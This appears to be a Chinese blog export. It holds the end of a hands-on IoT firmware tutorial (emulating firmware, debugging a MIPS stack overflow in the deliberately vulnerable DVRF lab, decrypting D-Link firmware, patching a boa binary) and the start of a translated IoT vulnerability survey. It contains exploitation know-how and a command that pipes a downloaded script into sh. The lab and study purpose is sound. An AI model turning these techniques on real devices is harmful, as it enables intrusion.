<p>对此提了个issue</p>
<h3 id="【方案3】AttifyOS">【方案3】AttifyOS</h3>
<p>这个方法比较稳，自己部署也太折磨人了（外加考试周给娃弄傻了）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624627289020.png" alt="1624627289020"></p>
<p><em>注：密码是attify</em></p>
<h2 id="模拟执行固件">模拟执行固件</h2>
<p>模拟固件运行：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624627931880.png" alt="1624627931880">通过192.168.0.50即可访问固件</p>
<h2 id="调试固件">调试固件</h2>
<p>这个部分用到了Damn Vulnerable Router Firmware这个项目，大小400M+，建议上gitee clone</p>
<p>安装以下工具：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line">sudo pip3 install capstone unicorn keystone-engine</span><br></pre></td></tr></table></figure>
<p>进入DVRF/Firmware/，用binwalk提取DVRF_v03.bin</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624632998578.png" alt="1624632998578"></p>
<p>提取出来的目录里有个文件夹pwnable，里面存放着漏洞程序示例，选取stack_bof_01程序进行实验，程序的源代码可以在DVRF/Pwnable Source/Intro/里查看</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633241653.png" alt="1624633241653"></p>
<p>首先用reasdelf查看程序架构</p>
<p>!<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633746613.png" alt="1624633746613"></p>
<p>（顺手试了一下checksec，这里居然有装😀）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624633809906.png" alt="1624633809906"></p>
<p>拷贝qwmu-mipsel-static到固件根目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp (which qemu-mipsel-static) .</span><br></pre></td></tr></table></figure>
<p>用qemu虚拟运行stack_bof_01：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624694537916.png" alt="1624694537916"></p>
<p>以调试的方式启动程序，并在1234端口进行监听：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01</span><br></pre></td></tr></table></figure>
<p>打开一个新的shell，运行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch pwnable/Intro/stack_bof_01</span><br><span class="line"></span><br><span class="line"># 设置架构</span><br><span class="line">set architecture mips</span><br><span class="line"></span><br><span class="line">#设置调试端口</span><br><span class="line">target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624704034068.png" alt="1624704034068"></p>
<p>创建trash触发溢出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pattern create 300</span><br></pre></td></tr></table></figure>
<p>带上它重新进行调试</p>
<p>gdb attach后继续让程序运行，触发vul</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624704529132.png" alt="1624704529132"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624714926982.png" alt="1624714926982"></p>
<p>接下来就直接ret2system，但经过尝试后发现，如果直接把跳转地址设置为后门函数dat_shell的起始地址0x400950会触发异常</p>
<p>查看函数汇编代码（MIPS…看不懂的话可以边看边学一波，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZseWluZ3FyL2FydGljbGUvZGV0YWlscy83MDczMDg4">MIPS 通用寄存器_flyingqr的专栏-CSDN博客_mips寄存器<i class="fa fa-external-link-alt"></i></span>；<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ2xvZGVhcnMvcC85NzYyNjE1Lmh0bWw=">MIPS汇编指令集 - 深海之炎 - 博客园 <i class="fa fa-external-link-alt"></i></span>；<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2xpeWFuZnUvbXE2NXBiL2J2N3hiNQ==">MIPS的汇编指令 · 语雀 <i class="fa fa-external-link-alt"></i></span>）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624718994151.png" alt="1624718994151"></p>
<p>调试中发现，当执行到0x400970时，gp寄存器指向了不可访问的地址</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624724526947.png" alt="1624724526947"></p>
<p>而gp的值是由上一条指令得到的</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624724654160.png" alt="1624724654160"></p>
<p>本来执行后v0要指向 指向__DT_MIPS_BASE_ADDRESS的指针</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624727049941.png" alt="1624727049941"></p>
<p>简单来说就是强行跳转到backdoor之后，因为t9（默认在运行中指向当前函数的起始地址）没有发生改变，导致在执行0x400970时产生异常访问</p>
<p>但可以发现（其实是按照exp来推…）main函数中的gp在-0x7fe4后刚好指向PTR__DT_MIPS_BASE_ADDRESS*（猜测原因是源代码中后门函数在main函数后面且没有被调用，导致编译时认为main函数和后门函数的 gp和表的偏移 相等）</p>
<p>于是得到<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624730236282.png" alt="1624730236282"></p>
<hr>
<p>update：</p>
<p>main函数中<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624731700885.png" alt="1624731700885"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624731779105.png" alt="1624731779105"></p>
<p>所以gp在函数执行完毕后依旧指向的是基地址表</p>
<hr>
<p><em>感觉对于mips程序的分析，Ghidra比IDA好用些</em></p>
<p>从这题也能看出mips和x86、x64的不同之处，<strong>除了这种特殊情况外，大多数情况下还是应该寻找gadget来进行跳转改变t9寄存器</strong></p>
<p><strong>这一节就到这，DVRF这个项目还设计了一些别的漏洞程序可以再进行分析</strong></p>
<h1>0x4 解密固件</h1>
<p>访问dlink的ftp服务器获得几个DIR-882的固件（图中选中的文件），时间跨度为2017~2020年</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624626949169.png" alt="1624626949169"></p>
<p>解压得到固件和对应的版本说明</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624772939989.png" alt="1624772939989"></p>
<h2 id="加密固件发布方案">加密固件发布方案</h2>
<p>一般来说，有三种发布固件的方案</p>
<ul>
<li>出厂时未加密，解密例程在高版本固件v1.1中给出，为后续的加密固件做准备<br>
对于这个方案，我们可以通过解密v1.1来获得解密例程</li>
<li>出厂时的固件已经加密，供应商决定更改高版本固件的加密方式，并发布了包含解密例程的未加密中间版本v1.2<br>
这一方案与上面那个类似</li>
<li>出厂时的固件已经加密，供应商决定更改高版本固件的加密方式，并发布了包含解密例程的使用原加密方式加密的过渡版本v1.3<br>
这种方案对获取解密例程的难度较大，可从硬件中直接提取固件或对发布的v1.3进行分析</li>
</ul>
<p>DIR-882的固件发布方案为第一种，示意图如下<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624781752755.png" alt="1624781752755"></p>
<p><em>虽然个人认为第三种方案才是较为常见的，但教程中并没有讲到。猜测除了从硬件中提取外，还可以通过模拟器模拟然后进行patch或拿头还原</em></p>
<h2 id="解密过程">解密过程</h2>
<p>用binwalk分析最新和最早的两个固件<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624781656552.png" alt="1624781656552"></p>
<p>经过binwalk分析，FW104B02正是存在解密程序的中间版本（从文件名也能看出）</p>
<blockquote>
<p>对于判断固件是否被加密/混淆还可以使用之前提到的binwalk -E 来查看文件各个区域的熵值</p>
</blockquote>
<p>提取该固件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -eM DIR882A1_FW104B02_Middle_FW_Unencrypt.bin  </span><br></pre></td></tr></table></figure>
<p>在最终目录下搜索找到imgdecrypt，从名字看出是下个版本固件的解密例程<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624790960410.png" alt="1624790960410"></p>
<p>可以静态分析程序的解密算法，也可以直接运行程序来对加密固件进行解密。</p>
<p>在本地运行时依旧需要借助qemu-mipsel-static模拟器，使用方法和上一节的模拟过程类似，不表。</p>
<p>利用imgdecrypt还可以还原出ftp服务器上提供的最新的固件，所以可能后续版本和Dlink其它型号的路由器也能用这个程序还原固件？Orz</p>
<h1>0x5 修复固件运行环境</h1>
<p>有一些固件因为硬件依赖等原因导致qemu和firmadyne之类的软件无法正确模拟</p>
<p>比如下面这个</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624798081527.png" alt="1624798081527"></p>
<blockquote>
<p>模拟固件运行的实质其实就是把固件的Web程序跑起来，而模拟失败则说明Web程序运行出错了，我们接下来就要看看Web程序报错的原因以及如何修复运行环境。</p>
</blockquote>
<h2 id="尝试运行固件">尝试运行固件</h2>
<p>首先binwalk提取固件，进入文件系统目录squashfs-root-0</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624842375040.png" alt="1624842375040"></p>
<p>找到web服务程序Boa</p>
<blockquote>
<p>Boa程序是一个轻量级的web服务器程序，常见于嵌入式系统中。dlink就是在boa开源代码的基础上新增了很多功能接口以实现路由器上的不同功能。boa程序的路径为/bin/boa，同时我们发现在/etc/boa路径下还有个boa的密码配置文件，我们可以直接获取到boa加密后的密码。</p>
</blockquote>
<p>用qemu-mips-static运行，结果产生了段错误</p>
<blockquote>
<p>mips 是32位大端字节序</p>
<p>mipsel 是32位小端字节序</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624843310448.png" alt="1624843310448"></p>
<h2 id="分析错误并修复">分析错误并修复</h2>
<blockquote>
<p>注：APMIB 是个Realtek的玩意（原来realtek还有做路由器相关的东西…）</p>
<ul>
<li>apmib_init(), 從 flash 讀出 mib 值寫入 RAM		–<span class="exturl" data-url="aHR0cHM6Ly9qeWhzaGluLnBpeG5ldC5uZXQvYmxvZy9wb3N0LzQ3MTYyMDAy">Realtek apmib library @ 邱小新の工作筆記 <i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>有些CVE（如CVE-2019-19823）就跟APMIB有关		–<span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXQudGVjaC8yMDE5LzEyLzE2L1JlYWx0ZWstVE9UT0xJTksuaHRtbA==">TOTOLINK and other Realtek SDK based routers - full takeover (sploit.tech)<i class="fa fa-external-link-alt"></i></span></p>
<p>MIB：management information base，与SNMP有关，可在维基里进一步了解：<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWFuYWdlbWVudF9pbmZvcm1hdGlvbl9iYXNl">Management information base - Wikipedia<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>由于没有flash，导致读mib失败</p>
<p>拖到反编译工具中分析。先定位到字符串“Initialize AP MIB failed!”的位置。注意到在输出这个字符串前有个调用APMIB初始化的跳转，在此下断点，IDA远程调试</p>
<p>QEMU的远程调试不需要gdbserver，-g 指定端口，ida 远程调试选项指定相应端口就行<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624891866217.png" alt="1624891866217"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624891907810.png" alt="1624891907810"></p>
<p>简单调试后发现，程序进入APMIB初始化函数后将返回值赋给v0，返回后对返回值进行判断。（跟着教程做完后，发现其实用静态分析看的就很明显，但多调试总是没有坏处的嘛）</p>
<p>跳转回去的位置在这：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624898602074.png" alt="1624898602074"></p>
<p>我们先试试看把原来的跳转patch一下能不能运行正常固件boa。</p>
<p>有以下两个可行方案：</p>
<ol>
<li>hxd（或其他二进制编辑器），把benz（0x14，不为0跳转）改为beqz（0x10，为0跳转）<br>
这个方法比较直接，定位到指令后把0x14改为0x10即可</li>
<li>Ghidra，把bne改为beq（Ghidra中反编译出的原指令为bne）</li>
</ol>
<ul>
<li><strong>如何用Ghidra进行patch并保存：</strong></li>
</ul>
<ol>
<li>下载python脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NjaGxhZndhbmRsZXIvZ2hpZHJhX1NhdmVQYXRjaA==">ghidra_SavePatch<i class="fa fa-external-link-alt"></i></span> 并放到Ghidra存放python脚本的目录（找不到目录的话，如图）。<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624946914008.png" alt="1624946914008"></li>
<li>按照下图导入脚本。</li>
<li>patch<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624947011340.png" alt="1624947011340"></li>
<li>光标放在更改的指令，在script manager里运行脚本。</li>
</ol>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tYXRlcmlhbHMucmFuZ2Vmb3JjZS5jb20vdHV0b3JpYWwvMjAyMC8wNC8xMi9QYXRjaGluZy1CaW5hcmllcy8=">Patching Binaries With Ghidra – RangeForce<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li><strong>不用ida的原因：</strong></li>
</ul>
<p>把patch保存到文件中时，发现报错，稍微搜了一下，依然不知道是啥原因orz</p>
<blockquote>
<p>418228: has no file mapping (original: 14 patched: 10)…skipping…</p>
</blockquote>
<p>再次运行试试，发现又报错了：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624968893594.png" alt="1624968893594"></p>
<p>再放到Ghidra里分析，依旧通过字符串定位错误触发点。<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624969614083.png" alt="1624969614083"></p>
<p>两个函数（调用的地方位于websAspInit）里的报错由open函数造成（图为create_chklist_file()，但两个报错类似，均为一开始打开某个文件出错）<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624972065509.png" alt="1624972065509"></p>
<p>用IDA调试发现报错后仍然继续运行，异常发生在执行apmib_get()时：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624973987614.png" alt="1624973987614"></p>
<p>具体在0x4084c9b0时，把[0+v0]里的值赋给v1，而0x1001明显是一个访问不了的地址<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624975561050.png" alt="1624975561050"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624976989927.png" alt="1624976989927"></p>
<p>查一下apmib_get是干啥的。似乎是用来获取硬件配置信息，但我们要想让固件跑起来可以不需要这个。那么直接把获得apmib_get入口后的跳转语句nop掉<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624977950116.png" alt="1624977950116"></p>
<p>重新尝试运行<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982108789.png" alt="1624982108789"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624978566220.png" alt="1624978566220"></p>
<p>固件会一直尝试朝 ioctl（设备驱动的控制接口）发送0x89f0（应该是一个SIOCDEVPRIVATE），我们模拟的固件并不支持，但没啥大影响。（用Google搜一下“Unsupported ioctl: cmd=0x89f0”可以找到一些蛮有意思的东西2333）</p>
<blockquote>
<p>关于ioctl：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW5zaGFucHQvYXJ0aWNsZS9kZXRhaWxzLzE5ODk3ODk3">ioctl()函数详解_shanshanpt的专栏-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>查看报错的页面（用vim看代码舒服一些），嗯，前端的东西：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982335259.png" alt="1624982335259"></p>
<p>从文件名可以猜到是个跟路由器界面语言选择有关的文件。</p>
<p>文件不长，注意到有个函数跟语言和硬件有关：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982776036.png" alt="1624982776036"></p>
<p>那么我们可以不让它运行到这个页面。</p>
<p>查找调用了*LangSelect.asp的页面，发现只有一个first.asp<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984447102.png" alt="1624984447102"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984569909.png" alt="1624984569909"></p>
<p><em>SC是哪的LangCode，哪位大兄弟查到了的话麻烦告诉我一下</em></p>
<p>直接修改，重新运行完事<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984880272.png" alt="1624984880272"></p>
<blockquote>
<p>这个固件成功运行后可以顺便看一看这个洞： <span class="exturl" data-url="aHR0cHM6Ly93aWtpLjk2Lm1rL0lPVCVFNSVBRSU4OSVFNSU4NSVBOC9ELUxpbmsvJUVGJUJDJTg4Q1ZFLTIwMTgtMjAwNTclRUYlQkMlODlELUxpbmslMjBESVItNjE5TCUyNjYwNUwlMjAlRTUlOTElQkQlRTQlQkIlQTQlRTYlQjMlQTglRTUlODUlQTUlRTYlQkMlOEYlRTYlQjQlOUUv">（CVE-2018-20057）D-Link DIR-619L&amp;605L 命令注入漏洞 - Wiki <i class="fa fa-external-link-alt"></i></span> ，直接用了后门</p>
</blockquote>
<p>这节的错误解决方法均通过修改指令，《路由器0day》书中的方法是伪造.so来劫持函数，也值得一学：<span class="exturl" data-url="aHR0cHM6Ly9wMWtrLmdpdGh1Yi5pby8yMDIwLzA0LzE1LyVFOCVCNyVBRiVFNyU5NCVCMSVFNSU5OSVBOC8lRTglQjclQUYlRTclOTQlQjElRTUlODglODYlRTYlOUUlOTAv">分析固件第一步<i class="fa fa-external-link-alt"></i></span></p>
<h1>0x6 结束</h1>
<p>感觉算是一个很不错的IoT固件分析入门教程，今天收到《路由器0day》后在路上粗略地看了下目录，除了专门的漏洞分析外，这个教程差不多把纯固件分析的要点都涉及到了（至于是不是 a bit out of date 就另当别论，不过感觉也还好⑧）</p>
]]></content>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>【翻译】A Survey of Security Vulnerability Analysis,Discovery, Detection, and Mitigation on IoT Devices</title>
    <url>/62497.html</url>
    <content><![CDATA[<p>在前面：<br>
完整阅读完的第一篇论文。这篇出自2019年MDPI的Future Internet，虽然最近两年出了更新的成果和趋势，但也本文也没有太过时，算是讲全了IoT研究的发展和角度。<br>
翻译和自己阅读还是挺不一样的，发现了自己语文水平蒟蒻，连啥时候用逗号都把握不住… DeepL 和 Google Translate 还是各有千秋。</p>
<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQ0NzEx">IoT设备安全漏洞分析、挖掘、检测和缓解综述 - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<span id="more"></span>
<h1>IoT设备安全漏洞分析、挖掘、检测和缓解综述</h1>
<p>来源：<span class="exturl" data-url="aHR0cDovL25ldHNlYy5jY2VydC5lZHUuY24vY2hzL3B1YmxpY2F0aW9ucy9mdXR1cmVpbnRlcm5ldDIwLWlvdA==">http://netsec.ccert.edu.cn/chs/publications/futureinternet20-iot<i class="fa fa-external-link-alt"></i></span></p>
<!-- vscode-markdown-toc -->
<ul>
<li>
<ol>
<li><a href="#">摘要</a></li>
</ol>
</li>
<li>
<ol start="2">
<li><a href="#-1">介绍</a></li>
</ol>
</li>
<li>
<ol start="3">
<li><a href="#-1">背景</a></li>
</ol>
<ul>
<li>3.1.<a href="#IoT">IoT架构</a></li>
<li>3.2.<a href="#-1">设备构成</a></li>
<li>3.3.<a href="#-1">攻击面</a>
<ul>
<li>3.3.1.<a href="#-1">硬件层</a></li>
<li>3.3.2.<a href="#-1">软件层</a></li>
<li>3.3.3.<a href="#-1">协议接口层</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="4">
<li><a href="#-1">漏洞分析、挖掘、检测和缓解</a></li>
</ol>
<ul>
<li>4.1.<a href="#-1">漏洞分析的基础框架研究</a></li>
<li>4.2.<a href="#-1">漏洞挖掘技术研究</a>
<ul>
<li>4.2.1.<a href="#-1">动态分析方法</a></li>
<li>4.2.2.<a href="#-1">静态分析方法</a></li>
</ul>
</li>
<li>4.3.<a href="#-1">漏洞检测研究</a>
<ul>
<li>4.3.1.<a href="#-1">网络扫描</a></li>
</ul>
</li>
<li>4.4.<a href="#-1">相似性检测</a>
<ul>
<li>4.4.1.<a href="#-1">源代码相似性检测</a></li>
<li>4.4.2.<a href="#-1">二进制代码相似性检测</a></li>
</ul>
</li>
<li>4.5.<a href="#-1">漏洞缓解研究</a>
<ul>
<li>4.5.1.<a href="#-1">自动化生成补丁</a></li>
<li>4.5.2.<a href="#-1">访问控制</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="5">
<li><a href="#-1">讨论</a></li>
</ol>
<ul>
<li>5.1.<a href="#-1">评估</a></li>
<li>5.2.<a href="#-1">难点</a>
<ul>
<li>5.2.1.<a href="#1ComplexityandHeterogeneityofDevice">（1）设备的复杂性和异构性（Complexity and Heterogeneity of Device）</a></li>
<li>5.2.2.<a href="#2Limitationsofdeviceresources">（2）设备资源的限制（Limitations of device resources）</a></li>
<li>5.2.3.<a href="#3Closed-SourceMeasures">（3）闭源措施（Closed-Source Measures）</a></li>
</ul>
</li>
<li>5.3.<a href="#-1">机会</a>
<ul>
<li>5.3.1.<a href="#1AI">（1）AI技术的应用</a></li>
<li>5.3.2.<a href="#2">（2）对第三方和开源代码的依赖</a></li>
<li>5.3.3.<a href="#3">（3）外围设备系统的开发</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="6">
<li><a href="#-1">研究方向</a></li>
</ol>
</li>
<li>
<ol start="7">
<li><a href="#-1">结论</a></li>
</ol>
</li>
</ul>
<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->
<!--more-->
<h2 id="1-a-name-a-摘要">1. <code>&lt;a name=''&gt;&lt;/a&gt;</code>摘要</h2>
<p>随着IoT产业的兴盛，多种多样的IoT设备开始迅速发展，智能家居、智能穿戴、智能制造、智能汽车等一系列和生活相关的领域得到大量使用。随之而来的是层出不穷的IoT设备上的漏洞。安全问题的增加会对用户的隐私和财产带来严重威胁。本文首先介绍了研究背景，包括IoT架构、设备构成和攻击面。我们回顾了有关IoT设备漏洞挖掘、检测、缓解技术最前沿的研究，随后通过评估指出了现在面临的困难和机会，最后预测和讨论了IoT设备上漏洞分析技术的研究方向。</p>
<h2 id="2-a-name-1-a-介绍">2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>介绍</h2>
<p>IoT正在成为最广泛和实用的在线平台。它将大量的传感器和控制器联网，帮助人们实现和万物之间的无缝通信。IoT正在成为互联网未来的关键，特别是近几年，随着IoT产业的兴盛，多种多样的IoT设备开始迅速发展，全球活跃的IoT设备已经达到70亿[^1]，它们在智能家居、智能穿戴、智能制造、智能汽车等一系列和生活相关的领域广泛使用，我们认为这会极大提升我们的生活质量。同时，IoT设备的安全问题经常发生，也难以解决。惠普的报告表明70%的IoT设备包含安全漏洞，平均每台设备有25个漏洞[^2]。攻击者利用这些漏洞控制设备，进行一系列非法的活动。最著名的例子是在2016年Mirai病毒控制了成百上千台IoT设备，用这些设备建造了一个僵尸网络发动TB级的dos攻击，攻击目标包括DNS服务提供商Dyn，这次攻击造成了严重的后果，包括导致美国部分的网络瘫痪[^3]。总的来说，随着IoT设备的广泛使用、安全漏洞的增加会对用户的隐私和安全，甚至人类的生活和财产带来严重威胁。面对频繁的攻击，IoT安全研究变得越来越流行。在美国Auto-ID于1999年第一次提出“物联网”的概念[^4]后，安全研究者们投身于IoT行业，研究安全架构和通信的标准[^5,^6]。随后产生了许多关于IoT安全的问题[^7-^12]。Zhang等人[^13]、Mahmoud等人[^14]指出了面临的问题和研究方向，于是，研究者开始在IoT安全领域使用传统安全研究的方法[^15]。随着AI的发展，将机器学习和深度学习应用于IoT安全上的概念开始产生[^16]。Alrawi等人[^17]，系统的总结了智能家居中设备、手机应用、云端和通信的IoT攻击点。Xie等人[^18]总结及了检测IoT漏洞的技术。最近，Zheng等人[^19]发表了IoT漏洞挖掘的技术概论。在上述的两篇论文中，漏洞挖掘和漏洞检测的界限较为模糊。在本文中，漏洞挖掘的技术即挖掘未知的漏洞，漏洞检测指针对已知漏洞的检测。通过以上调查，我们发现现有的研究关注于IoT安全问题，缺少分析技术，其次，漏洞分析技术的重点在漏洞挖掘和检测，缺少漏洞缓解技术，综上，现有的IoT安全的技术总结还不够全面。为了解决前面提到的问题，我们希望对以下个方面做出一些贡献：</p>
<ul>
<li>首先，我们把重点从IoT架构转移到IoT设备；其次，精简IoT设备安全技术的分类；另外我们总结了现有的研究，包括漏洞分析的基础框架、挖掘未知的漏洞、检测已知的漏洞、漏洞缓解</li>
<li>我们评估了现有的关于IoT设备漏洞分析的研究。除此之外，我们深入分析了阻碍安全研究技术发展的原因，指出了面临的困难和机会</li>
<li>我们回顾了技术发展的背景，并为相关研究者提出了未来研究的方向</li>
</ul>
<p>这篇论文的结构如下：第二节描述了IoT安全的背景，介绍了IoT设备的架构、设备构成和攻击面；第三节回顾了已有的IoT设备安全研究，包括漏洞分析、挖掘、检测和缓解；第四节基于对漏洞分析技术的评估，总结了目前遇到的问题和机会；第五节提出了未来研究的热点方向；第六节对论文进行了总结</p>
<h2 id="3-a-name-1-a-背景">3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>背景</h2>
<h3 id="3-1-a-name-IoT-a-IoT架构">3.1. <code>&lt;a name='IoT'&gt;&lt;/a&gt;</code>IoT架构</h3>
<p>随着网络的快速发展，越来越多的家用和工业设备开始联网，给我们带来了多元化的生活。物联网架构主要有两个发展方向：消费者层面和产业层面<br>
在消费者层面，如果我们将它们按照应用场景划分，有几类设备类型例如工业制造、智能家居、智能医疗和智能汽车，其中智能家居的发展相对成熟。互联网巨头——三星、谷歌、苹果和小米占据大部分市场份额，同时，它们也发布了SmartThings[^20]、Google Weave[^21]、Apple HomeKit[^22]、HomeAssistant[^23] 和 XiaoMi IoT[^24]等物联网平台。通过调查这些平台，我们发现绝大多数IoT遵循“设备&lt;-&gt;云端&lt;-&gt;用户”这一架构（如图1）。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613122500.png" alt="20210613122500"><br>
智能设备大部分都放在家中，它们和云服务器进行通信，然后直接或间接通过WiFi[^25]、ZigBee[^26]、蓝牙[^27]或其他协议接入网络。它们上传传感器收集的数据，接收发送给执行单元的控制命令。IoT架构不仅依赖供应商的云，同时也依赖第三方的云，它们相互支持，并为各种功能提供多样化的服务。用户可以通过手机或者电脑连接云查看状态并下载数据。对于一些简单场景例如可穿戴设备，“设备&lt;-&gt;用户”架构更加实用。</p>
<p>对于产业层面，IoT架构延续了IT的做法，通过服务器集中管理用户和设备的交互（如图2），区别是设备首先通过OT和PLC进行通信。因此产业中的设备等同于PLC和“传感器+执行器”。安全研究的重点在于PLC。“设备&lt;-&gt;用户”架构也存在于产业物联网：管理员用配置软件控制设备。虽然面向用户的工业终端例如智能仪表也尝试了云的模式，但基于安全考虑没有得到广泛使用<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210617205408.png" alt="20210617205408"></p>
<h3 id="3-2-a-name-1-a-设备构成">3.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>设备构成</h3>
<p>不论是汽车制造中大而复杂的机器，亦或穿戴设备里小巧智能的手环，它们都包含了相对固定的零件例如芯片、闪存、固件等。它们主要包含硬件和软件部分</p>
<ol>
<li>硬件</li>
</ol>
<ul>
<li>逻辑芯片：对于复杂的设备来说，它们需要多个逻辑芯片或cpu来运行内置的操作系统；对于简单的嵌入式设备或许只需要一个微处理器来运行程序</li>
<li>内存：为系统和程序运行提供空间，大小从KB到GB不等</li>
<li>闪存：储存IoT设备固件。部分设备的bootloader也存放在闪存</li>
<li>网络模块。IoT设备和传统嵌入式设备的区别就是前者连接了网络。他们通常采用无线技术连接到互联网，如AP</li>
<li>串行调试接口：IoT设备需要与外部进行通信，以便调试。串行调试接口可以让开发人员发送和接收命令。最常见的接口是通用异步接收器/发送器UART</li>
</ul>
<ol start="2">
<li>软件</li>
</ol>
<ul>
<li>Bootloader：在IoT设备系统启动前，它初始化了硬件设备，将固件加载到引导设备。它使系统的软件和硬件环境达到合适的状态</li>
<li>固件：固件包括了操作系统、文件系统和一系列服务程序。IoT设备上的安全研究通常从固件分析开始</li>
</ul>
<h3 id="3-3-a-name-1-a-攻击面">3.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>攻击面</h3>
<p>针对IoT设备的攻击面不仅包括传统软件安全领域，因为它们的特殊结构和功能，也包括了新的攻击领域。根据IoT架构和设备构成，攻击面可以分为三个层面（图3）</p>
<ul>
<li>图3<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613163604.png" alt="20210613163604"></li>
</ul>
<h4 id="3-3-1-a-name-1-a-硬件层">3.3.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>硬件层</h4>
